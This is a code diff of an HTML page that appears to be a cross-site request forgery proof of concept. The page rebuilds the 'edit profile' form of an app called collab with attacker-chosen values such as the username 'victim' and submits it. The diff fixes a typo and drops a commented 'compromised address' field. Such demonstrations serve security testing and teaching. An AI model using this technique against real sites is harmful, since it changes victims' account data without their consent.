@@ -1,7 +1,7 @@
 <html>
 <body>
 <h1>
-This page creates a form like the one on collab's edit profit, fills fields and submits the form.
+This page creates a form like the one on collab's edit profile, fills fields and submits the form. 
 </h1>
 <script>
 
@@ -19,10 +19,6 @@ e.target = "_self";
 // corresponding to the edit user form
 // with values chosen by the attacker. 
 var form_fields;
-
-//Address line
-//form_fields += 
-//"<td class='right'><input type='text' value='compromised address' name='address1' id='address1' /></td>";
 
 //Username line
 form_fields += "class='right'><input type='text' class='text' value='victim' name='name' id='name' required='1' realname='Name' tabindex='1' /></td>";
